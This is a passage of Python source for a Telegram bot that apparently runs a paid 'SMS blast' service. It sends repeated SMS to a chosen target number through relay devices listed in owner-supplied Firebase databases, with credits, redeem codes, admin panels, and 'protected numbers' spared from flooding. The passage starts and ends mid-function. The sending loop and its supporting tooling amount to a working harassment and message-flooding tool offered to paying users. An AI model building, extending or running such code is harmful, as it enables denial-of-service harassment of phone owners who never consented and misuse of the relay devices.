                        if ok:
                            sent_ok += 1
                            device_sent += 1
                            msgs_left -= 1
                            d_temp = load()
                            if not unlimited:
                                deduct_credits(uid, 1, d_temp)
                            d_temp["stats"]["total_sent"] = d_temp["stats"].get("total_sent", 0) + 1
                            if str(uid) in d_temp["users"]:
                                d_temp["users"][str(uid)]["uses"] = d_temp["users"][str(uid)].get("uses", 0) + 1
                            d_temp.setdefault("sms_history", {}).setdefault(str(uid), []).append({
                                "number": number, "message": message[:100], "timestamp": int(time.time()), "status": "sent"
                            })
                            save(d_temp)
                        else:
                            sent_fail += 1
                            msgs_left -= 1
                        api_usage_delta.setdefault(fb_id, {"sent": 0, "failed": 0})
                        api_usage_delta[fb_id]["sent" if ok else "failed"] += 1
                        now = time.time()
                        if now - last_update_time >= _PROGRESS_UPDATE_INTERVAL or (sent_ok + sent_fail) == count or session.cancelled:
                            curr_cr = get_user_credits(uid, load()) if not unlimited else None
                            try:
                                await progress_msg.edit_text(
                                    progress_text(sent_ok, sent_fail, count, curr_cr, speed_label_display),
                                    reply_markup=stop_send_kb() if not session.cancelled else None,
                                    parse_mode="HTML",
                                )
                            except TelegramBadRequest:
                                pass
                            last_update_time = now
                    await asyncio.sleep(speed)
        finally:
            async with session.lock:
                session.sent = sent_ok
                session.failed = sent_fail

    task = asyncio.create_task(do_send())
    session.task = task
    await task
    was_cancelled = session.cancelled
    async with SESSIONS_LOCK:
        USER_SESSIONS.pop(uid, None)

    d_final = load()
    d_final["stats"]["total_failed"] = d_final["stats"].get("total_failed", 0) + sent_fail
    for fb_id, delta in api_usage_delta.items():
        d_final["stats"].setdefault("api_usage", {}).setdefault(fb_id, {"sent": 0, "failed": 0})
        d_final["stats"]["api_usage"][fb_id]["sent"] += delta["sent"]
        d_final["stats"]["api_usage"][fb_id]["failed"] += delta["failed"]
    duration = int(time.time() - start_time)
    log_activity(d_final, "sms_blast", uid, f"Sent:{sent_ok}, Fail:{sent_fail}, Dur:{fmt_duration(duration)}, Stop:{was_cancelled}")
    save(d_final)

    asyncio.create_task(
        send_channel_log(
            bot,
            f"🚀 <b>SMS BLAST LOG</b>\n👤 UID: <code>{uid}</code>\n📞 Target: <code>{number}</code>\n"
            f"✅ Sent: <b>{sent_ok}</b> | ❌ Failed: <b>{sent_fail}</b>\n⏱ Duration: <b>{fmt_duration(duration)}</b>",
        )
    )

    credit_text = f"\n{em(EMOJI_MONEY, '💳')} Remaining: <b>{get_user_credits(uid, load())}</b>" if not unlimited else ""
    back_btn = (
        [btn("ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ", "owner:home", EMOJI_GEAR, "🔙", style="primary")]
        if is_owner(uid, load())
        else [btn("ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", "admin:home", EMOJI_GEAR, "🔙", style="primary")]
        if is_admin(uid, load())
        else [btn("sᴇɴᴅ ᴀɴᴏᴛʜᴇʀ", "user:send", EMOJI_ROCKET, "📤", style="success"), btn("ʜᴏᴍᴇ", "user:home", EMOJI_STAR, "🏠", style="primary")]
    )
    try:
        await progress_msg.edit_text(
            f"{em(EMOJI_CHECK, '✅')} <b>SMS Blast Result</b>\n\n"
            f"{em(EMOJI_PHONE, '📞')} To: <code>{mask_number(number)}</code>\n"
            f"{em(EMOJI_CHECK, '✅')} Sent: <b>{sent_ok}</b> | {em(EMOJI_CROSS, '❌')} Failed: <b>{sent_fail}</b>"
            f"{credit_text}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[back_btn]),
            parse_mode="HTML",
        )
    except Exception:
        pass

@R.callback_query(F.data == "user:stop_send")
async def user_stop_send(cq: CallbackQuery):
    uid = cq.from_user.id
    async with SESSIONS_LOCK:
        session = USER_SESSIONS.get(uid)
        if not session or (session.task and session.task.done()):
            await cq.answer("✅ Koi active sending nahi!", show_alert=True)
            return
        session.cancelled = True
    await cq.answer("🛑 Stop signal bhej diya!", show_alert=True)

# ========== OWNER / ADMIN / USER PANEL HANDLERS ==========
@R.callback_query(F.data.in_({"owner:home", "owner:refresh"}))
async def owner_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    try:
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    except TelegramBadRequest:
        pass

@R.callback_query(F.data.startswith("owner:fb:menu"))
async def owner_fb_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.clear()
    parts = cq.data.split(":")
    page = int(parts[3]) if len(parts) > 3 else 0
    await cq.message.edit_text(f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>\n\nTotal: <b>{len(d.get('firebases', []))}</b>", reply_markup=fb_menu_kb(d, page), parse_mode="HTML")

@R.callback_query(F.data == "owner:fb:add")
async def owner_fb_add_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_firebase)
    await cq.message.edit_text(f"{em(EMOJI_FIRE, '🔥')} <b>Add Single Firebase</b>\n\nFormat: <code>Label | https://xyz.firebaseio.com</code>", reply_markup=kb([(f"{sc('cancel')}", "owner:fb:menu:0")]), parse_mode="HTML")

@R.message(S.add_firebase)
async def owner_fb_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    text = msg.text.strip()
    label, url = (text.split("|", 1)[0].strip(), text.split("|", 1)[1].strip()) if "|" in text else (text.replace("https://", "").split(".")[0][:20], text)
    if not url.startswith("http"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} URL must start with http/https.", parse_mode="HTML")
        return
    url = url.rstrip("/")
    fbs = d.get("firebases", [])
    if not any(fb["url"] == url for fb in fbs):
        fbs.append({"id": str(int(time.time())), "url": url, "label": label, "added_at": int(time.time())})
        d["firebases"] = fbs
        save(d)
    await state.clear()
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} <b>Firebase Added!</b>\n<code>{url}</code>", reply_markup=fb_menu_kb(load()), parse_mode="HTML")

@R.callback_query(F.data == "owner:fb:add_file")
async def owner_fb_add_file_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_firebase_file)
    await cq.message.edit_text(f"{em(EMOJI_FIRE, '🔥')} <b>Bulk Add Firebase (.txt)</b>", reply_markup=kb([(f"{sc('cancel')}", "owner:fb:menu:0")]), parse_mode="HTML")

@R.message(S.add_firebase_file, F.document)
async def owner_fb_add_file_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    if not (msg.document.file_name or "").endswith(".txt"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf <code>.txt</code> file bhejein!", parse_mode="HTML")
        return
    info = await msg.bot.get_file(msg.document.file_id)
    content = (await msg.bot.download_file(info.file_path)).read().decode("utf-8", errors="ignore")
    fbs = d.get("firebases", [])
    existing = {fb["url"].rstrip("/") for fb in fbs}
    added = 0
    for line in content.splitlines():
        line = line.strip()
        if not line:
            continue
        label, url = (line.split("|", 1)[0].strip(), line.split("|", 1)[1].strip()) if "|" in line else (line.replace("https://", "").split(".")[0][:20], line)
        url = url.rstrip("/")
        if url.startswith("http") and url not in existing:
            existing.add(url)
            fbs.append({"id": str(int(time.time() * 1000) + random.randint(10, 99)), "url": url, "label": label, "added_at": int(time.time())})
            added += 1
    d["firebases"] = fbs
    save(d)
    await state.clear()
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Added <b>{added}</b> Firebase DB(s).", reply_markup=fb_menu_kb(load()), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:fb:del:"))
async def owner_fb_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    parts = cq.data.split(":")
    fb_id = parts[3]
    page = int(parts[4]) if len(parts) > 4 else 0
    d["firebases"] = [fb for fb in d["firebases"] if fb["id"] != fb_id]
    save(d)
    global CACHED_DEVICES, FB_DEVICE_COUNTS
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") != fb_id]
    FB_DEVICE_COUNTS.pop(fb_id, None)
    await cq.answer("🗑 Removed!")
    await cq.message.edit_text(f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>", reply_markup=fb_menu_kb(load(), page), parse_mode="HTML")

@R.callback_query(F.data == "owner:stats")
async def owner_stats_cb(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    devices = get_cached_devices() or await get_all_online_devices(d)
    full = api_stats_text(d) + f"\n\n{em(EMOJI_CHECK, '🟢')} <b>Online Devices ({len(devices)})</b>"
    await cq.message.edit_text(full[:4000], reply_markup=kb([(f"{sc('refresh')}", "owner:stats"), (f"{sc('back')}", "owner:home")]), parse_mode="HTML")

@R.callback_query(F.data == "owner:owners:menu")
async def owner_owners_menu(cq: CallbackQuery):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await cq.message.edit_text(f"{em(EMOJI_CROWN, '👑')} <b>Super Admins</b> ({len(d.get('owners', []))}/6)", reply_markup=owners_menu_kb(d), parse_mode="HTML")

@R.callback_query(F.data == "owner:owners:add")
async def owner_owners_add_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_owner)
    await cq.message.edit_text(f"{em(EMOJI_CROWN, '👑')} <b>Add Super Admin</b>\n\nUser ID bhejein:", reply_markup=kb([(f"{sc('cancel')}", "owner:owners:menu")]), parse_mode="HTML")

@R.message(S.add_owner)
async def owner_owners_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        new_id = int(msg.text.strip())
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID bhejein.", parse_mode="HTML")
        return
    if new_id not in d.get("owners", []) and len(d.get("owners", [])) < 6:
        d["owners"].append(new_id)
        save(d)
    await state.clear()
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Updated Super Admins.", reply_markup=owners_menu_kb(load()), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:owners:del:"))
async def owner_owners_del(cq: CallbackQuery):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    del_id = int(cq.data.split("owner:owners:del:", 1)[1])
    if del_id != MAIN_OWNER and del_id not in SUPER_ADMINS and del_id in d["owners"]:
        d["owners"].remove(del_id)
        save(d)
    await cq.message.edit_text(f"{em(EMOJI_CROWN, '👑')} <b>Super Admins</b>", reply_markup=owners_menu_kb(load()), parse_mode="HTML")

@R.callback_query(F.data == "owner:admins:menu")
async def owner_admins_menu(cq: CallbackQuery):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await cq.message.edit_text(f"{em(EMOJI_SHIELD, '🛡')} <b>Admins</b>", reply_markup=admins_menu_kb(d), parse_mode="HTML")

@R.callback_query(F.data == "owner:admins:add")
async def owner_admins_add_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_admin)
    await cq.message.edit_text(f"{em(EMOJI_SHIELD, '🛡')} <b>Add Admin</b>\n\nUser ID bhejein:", reply_markup=kb([(f"{sc('cancel')}", "owner:admins:menu")]), parse_mode="HTML")

@R.message(S.add_admin)
async def owner_admins_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        new_id = int(msg.text.strip())
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID bhejein.", parse_mode="HTML")
        return
    if new_id not in d.get("admins", []):
        d.setdefault("admins", []).append(new_id)
        save(d)
    await state.clear()
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Admin Added!", reply_markup=admins_menu_kb(load()), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:admins:del:"))
async def owner_admins_del(cq: CallbackQuery):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    del_id = int(cq.data.split("owner:admins:del:", 1)[1])
    if del_id in d.get("admins", []):
        d["admins"].remove(del_id)
        save(d)
    await cq.message.edit_text(f"{em(EMOJI_SHIELD, '🛡')} <b>Admins</b>", reply_markup=admins_menu_kb(load()), parse_mode="HTML")

@R.callback_query(F.data.in_({"owner:free:on", "owner:free:off"}))
async def owner_free_toggle(cq: CallbackQuery):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    d["free_mode"] = cq.data == "owner:free:on"
    save(d)
    await cq.answer("✅ Mode updated!", show_alert=True)
    await cq.message.edit_text(owner_panel_text(load()), reply_markup=owner_kb(load()), parse_mode="HTML")

@R.callback_query(F.data.in_({"owner:users:list", "admin:users:list"}))
async def panel_users_list(cq: CallbackQuery):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    text, markup = users_list_kb(d, "owner" if is_owner(uid, d) else "admin", 0)
    await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")

@R.callback_query(F.data.regexp(r"^(owner|admin):users:pg:(\d+)$"))
async def panel_users_page(cq: CallbackQuery):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    parts = cq.data.split(":")
    text, markup = users_list_kb(d, parts[0], int(parts[3]))
    await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")

@R.callback_query(F.data.in_({"owner:ban", "admin:ban"}))
async def panel_ban_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    await state.set_state(S.ban_user)
    await cq.message.edit_text(f"{em(EMOJI_CROSS, '🚫')} <b>Ban User</b>\n\nUser ID bhejein:", reply_markup=kb([(f"{sc('cancel')}", "owner:home" if is_owner(cq.from_user.id, d) else "admin:home")]), parse_mode="HTML")

@R.message(S.ban_user)
async def panel_ban_done(msg: Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        await state.clear()
        return
    try:
        ban_id = int(msg.text.strip())
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID bhejein.", parse_mode="HTML")
        return
    if not is_owner(ban_id, d) and not is_admin(ban_id, d) and ban_id not in d.get("banned", []):
        d.setdefault("banned", []).append(ban_id)
        save(d)
    await state.clear()
    await msg.answer(f"{em(EMOJI_CROSS, '🚫')} User <code>{ban_id}</code> banned.", reply_markup=owner_kb(load()) if is_owner(msg.from_user.id, d) else admin_kb(load()), parse_mode="HTML")

@R.callback_query(F.data.in_({"owner:unban:menu", "admin:unban:menu"}))
async def panel_unban_menu(cq: CallbackQuery):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    if not d.get("banned", []):
        await cq.answer("✅ Koi banned nahi!", show_alert=True)
        return
    await cq.message.edit_text(f"{em(EMOJI_CHECK, '🔓')} <b>Unban User</b>", reply_markup=unban_menu_kb(d, "owner" if is_owner(cq.from_user.id, d) else "admin"), parse_mode="HTML")

@R.callback_query(F.data.regexp(r"^(owner|admin):unban:do:(\d+)$"))
async def panel_unban_do(cq: CallbackQuery):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    ban_id = int(cq.data.split(":")[-1])
    if ban_id in d.get("banned", []):
        d["banned"].remove(ban_id)
        save(d)
    await cq.answer(f"✅ {ban_id} unbanned!", show_alert=True)
    await cq.message.edit_text(owner_panel_text(load()) if is_owner(cq.from_user.id, load()) else admin_panel_text(load()), reply_markup=owner_kb(load()) if is_owner(cq.from_user.id, load()) else admin_kb(load()), parse_mode="HTML")

@R.callback_query(F.data.in_({"owner:broadcast", "admin:broadcast"}))
async def panel_broadcast_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    await state.set_state(S.broadcast)
    await cq.message.edit_text(f"{em(EMOJI_BELL, '📢')} <b>Broadcast</b>\n\nMessage bhejein:", reply_markup=kb([(f"{sc('cancel')}", "owner:home" if is_owner(cq.from_user.id, d) else "admin:home")]), parse_mode="HTML")

@R.message(S.broadcast)
async def panel_broadcast_do(msg: Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        await state.clear()
        return
    await state.clear()
    ok = fail = 0
    for uid_str in d.get("users", {}):
        try:
            await msg.bot.send_message(int(uid_str), f"{em(EMOJI_BELL, '📢')} <b>Broadcast</b>\n\n{msg.text or ''}", parse_mode="HTML")
            ok += 1
        except Exception:
            fail += 1
        await asyncio.sleep(0.05)
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Sent: <b>{ok}</b> | Failed: <b>{fail}</b>", reply_markup=owner_kb(load()) if is_owner(msg.from_user.id, load()) else admin_kb(load()), parse_mode="HTML")

@R.callback_query(F.data == "owner:videos:menu")
async def owner_videos_menu(cq: CallbackQuery):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    await cq.message.edit_text(f"{em(EMOJI_VIDEO, '📹')} <b>Video Manager</b> ({len(d.get('videos', []))})", reply_markup=videos_menu_kb(d), parse_mode="HTML")

@R.callback_query(F.data == "owner:videos:add")
async def owner_videos_add_start(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    await state.set_state(S.add_video)
    await cq.message.edit_text(f"{em(EMOJI_VIDEO, '📹')} <b>Add Video</b>\n\nVideo ya File ID bhejein:", reply_markup=kb([(f"{sc('cancel')}", "owner:videos:menu")]), parse_mode="HTML")

@R.message(S.add_video)
async def owner_videos_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        await state.clear()
        return
    vid = msg.video.file_id if msg.video else (msg.document.file_id if msg.document else (msg.text or "").strip())
    if vid:
        d.setdefault("videos", []).append(vid)
        save(d)
    await state.clear()
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Video Saved!", reply_markup=videos_menu_kb(load()), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:videos:del:"))
async def owner_videos_del(cq: CallbackQuery):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    idx = int(cq.data.split("owner:videos:del:", 1)[1])
    if 0 <= idx < len(d.get("videos", [])):
        d["videos"].pop(idx)
        save(d)
    await cq.message.edit_text(f"{em(EMOJI_VIDEO, '📹')} <b>Video Manager</b>", reply_markup=videos_menu_kb(load()), parse_mode="HTML")

@R.callback_query(F.data == "owner:videos:bulk_del")
async def owner_videos_bulk_del(cq: CallbackQuery):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    d["videos"] = []
    save(d)
    await cq.answer("🗑 All videos deleted!", show_alert=True)
    await cq.message.edit_text(f"{em(EMOJI_VIDEO, '📹')} <b>Video Manager</b>", reply_markup=videos_menu_kb(load()), parse_mode="HTML")

@R.callback_query(F.data == "user:random_video")
async def user_trigger_video(cq: CallbackQuery):
    if not load().get("videos", []):
        await cq.answer("❌ Koi video available nahi!", show_alert=True)
        return
    await cq.answer("📹 Sending video...")
    await send_random_video(cq.bot, cq.message.chat.id, caption=f"{em(EMOJI_VIDEO, '📹')} Enjoy!")

@R.callback_query(F.data == "owner:protect")
async def owner_protect_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.protect_number)
    await cq.message.edit_text(f"{em(EMOJI_LOCK, '🔒')} <b>Protect Number</b>\n\nNumber bhejein:", reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")

@R.message(S.protect_number)
async def owner_protect_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    num = msg.text.strip()
    PROTECTED_NUMBERS[num] = msg.from_user.id
    d["protected_numbers"] = PROTECTED_NUMBERS
    save(d)
    await state.clear()
    await msg.answer(f"{em(EMOJI_LOCK, '🔒')} Protected <code>{num}</code>", reply_markup=owner_kb(load()), parse_mode="HTML")

@R.callback_query(F.data == "owner:protected_list")
async def owner_protected_list(cq: CallbackQuery):
    d = load()
    prot = d.get("protected_numbers", {})
    txt = "\n".join(f"📞 <code>{n}</code> — 🔒 <code>{u}</code>" for n, u in prot.items()) or "<i>Koi number protected nahi hai.</i>"
    await cq.message.edit_text(f"{em(EMOJI_LOCK, '🔐')} <b>Protected Numbers</b>\n\n{txt}", reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")

@R.callback_query(F.data == "owner:track")
async def owner_track_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.track_number)
    await cq.message.edit_text(f"{em(EMOJI_STAR, '📊')} <b>Track Number</b>\n\nNumber bhejein:", reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")

@R.message(S.track_number)
async def owner_track_done(msg: Message, state: FSMContext):
    d = load()
    num = msg.text.strip()
    await state.clear()
    found = [u for u, h in d.get("sms_history", {}).items() if any(e.get("number") == num for e in h)]
    await msg.answer(f"📞 <code>{num}</code>\nUsers: <code>{', '.join(found) or 'None'}</code>", reply_markup=owner_kb(load()), parse_mode="HTML")

@R.callback_query(F.data == "owner:add_all_credits")
async def owner_add_all_credits_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.add_all_credits_amount)
    await cq.message.edit_text(f"{em(EMOJI_MONEY, '💰')} <b>Add Credits All</b>\n\nAmount bhejein:", reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")

@R.message(S.add_all_credits_amount)
async def owner_add_all_credits_done(msg: Message, state: FSMContext):
    d = load()
    amt = int(msg.text.strip())
    await state.clear()
    for uid_str in d.get("users", {}):
        add_credits(int(uid_str), amt, d)
    save(d)
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Added <b>{amt}</b> credits to all users.", reply_markup=owner_kb(load()), parse_mode="HTML")

@R.callback_query(F.data == "owner:deduct_all_credits")
async def owner_deduct_all_credits_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.deduct_all_credits_amount)
    await cq.message.edit_text(f"{em(EMOJI_MONEY, '💰')} <b>Deduct All Credits</b>\n\nAmount bhejein:", reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")

@R.message(S.deduct_all_credits_amount)
async def owner_deduct_all_credits_done(msg: Message, state: FSMContext):
    d = load()
    amt = int(msg.text.strip())
    await state.clear()
    for uid_str, u in d.get("users", {}).items():
        if not is_owner(int(uid_str), d):
            u["credits"] = max(0, u.get("credits", 0) - amt)
    save(d)
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Deducted up to <b>{amt}</b> credits from users.", reply_markup=owner_kb(load()), parse_mode="HTML")

@R.callback_query(F.data == "user:transfer")
async def user_transfer_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if get_user_credits(uid, d) < 2:
        await cq.answer("❌ Minimum 2 credits chahiye!", show_alert=True)
        return
    await state.set_state(S.transfer_credits_uid)
    await cq.message.edit_text(f"{em(EMOJI_MONEY, '💸')} <b>Transfer Credits</b>\n\nTarget User ID bhejein:", reply_markup=kb([(f"{sc('cancel')}", "user:home")]), parse_mode="HTML")

@R.message(S.transfer_credits_uid)
async def user_transfer_uid(msg: Message, state: FSMContext):
    await state.update_data(transfer_target=int(msg.text.strip()))
    await state.set_state(S.transfer_credits_amount)
    await msg.answer(f"{em(EMOJI_MONEY, '💸')} Kitne credits transfer karne hain?", reply_markup=kb([(f"{sc('cancel')}", "user:home")]), parse_mode="HTML")

@R.message(S.transfer_credits_amount)
async def user_transfer_amount(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    amt = int(msg.text.strip())
    target = (await state.get_data()).get("transfer_target")
    await state.clear()
    if amt > 0 and amt <= get_user_credits(uid, d) // 2 and deduct_credits(uid, amt, d):
        add_credits(target, amt, d)
        save(d)
        await msg.answer(f"{em(EMOJI_CHECK, '✅')} Transferred <b>{amt}</b> credits to <code>{target}</code>.", reply_markup=user_kb(), parse_mode="HTML")
    else:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid amount (max half of your credits).", reply_markup=user_kb(), parse_mode="HTML")

@R.callback_query(F.data == "owner:credits:add")
async def owner_credits_add_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_credits_uid)
    await cq.message.edit_text(f"{em(EMOJI_MONEY, '💰')} <b>Add Credits</b>\n\nUser ID bhejein:", reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")

@R.message(S.add_credits_uid)
async def owner_credits_add_uid(msg: Message, state: FSMContext):
    await state.update_data(credit_uid=int(msg.text.strip()))
    await state.set_state(S.add_credits_amount)
    await msg.answer(f"{em(EMOJI_MONEY, '💰')} Amount bhejein:", reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")

@R.message(S.add_credits_amount)
async def owner_credits_add_amount(msg: Message, state: FSMContext):
    d = load()
    uid = (await state.get_data()).get("credit_uid")
    amt = int(msg.text.strip())
    await state.clear()
    add_credits(uid, amt, d)
    save(d)
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Added <b>{amt}</b> credits to <code>{uid}</code>.", reply_markup=owner_kb(load()), parse_mode="HTML")

@R.callback_query(F.data == "owner:credits:deduct")
async def owner_credits_deduct_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.deduct_credits_uid)
    await cq.message.edit_text(f"{em(EMOJI_MONEY, '💰')} <b>Deduct Credits</b>\n\nUser ID bhejein:", reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")

@R.message(S.deduct_credits_uid)
async def owner_credits_deduct_uid(msg: Message, state: FSMContext):
    await state.update_data(deduct_uid=int(msg.text.strip()))
    await state.set_state(S.deduct_credits_amount)
    await msg.answer(f"{em(EMOJI_MONEY, '💰')} Amount bhejein:", reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")

@R.message(S.deduct_credits_amount)
async def owner_credits_deduct_amount(msg: Message, state: FSMContext):
    d = load()
    uid = (await state.get_data()).get("deduct_uid")
    amt = int(msg.text.strip())
    await state.clear()
    deduct_credits(uid, amt, d)
    save(d)
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Deducted <b>{amt}</b> credits from <code>{uid}</code>.", reply_markup=owner_kb(load()), parse_mode="HTML")

@R.callback_query(F.data == "owner:redeem:menu")
async def owner_redeem_menu(cq: CallbackQuery):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    codes = d.get("redeem_codes", {})
    txt = "\n".join(f"<code>{c}</code> — 💰{v['credits']} ({v['uses_left']} left)" for c, v in list(codes.items())[:10]) or "<i>No codes</i>"
    rows = [
        [btn("ɢᴇɴᴇʀᴀᴛᴇ ᴄᴏᴅᴇ", "owner:redeem:gen", EMOJI_CHECK, "➕", style="success")],
        [btn("ᴅᴇʟᴇᴛᴇ ᴄᴏᴅᴇ", "owner:redeem:del", EMOJI_CROSS, "🗑", style="danger")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")],
    ]
    await cq.message.edit_text(f"{em(EMOJI_GIFT, '🎁')} <b>Redeem Codes</b>\n\n{txt}", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:redeem:gen")
async def owner_redeem_gen_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.gen_redeem_credits)
    await cq.message.edit_text(f"{em(EMOJI_GIFT, '🎁')} Credits kitne dene hain?", reply_markup=kb([(f"{sc('cancel')}", "owner:redeem:menu")]), parse_mode="HTML")

@R.message(S.gen_redeem_credits)
async def owner_redeem_credits(msg: Message, state: FSMContext):
    await state.update_data(gen_credits=int(msg.text.strip()))
    await state.set_state(S.gen_redeem_uses)
    await msg.answer(f"{em(EMOJI_GIFT, '🎁')} Max uses kitne hain?", reply_markup=kb([(f"{sc('cancel')}", "owner:redeem:menu")]), parse_mode="HTML")

@R.message(S.gen_redeem_uses)
async def owner_redeem_uses(msg: Message, state: FSMContext):
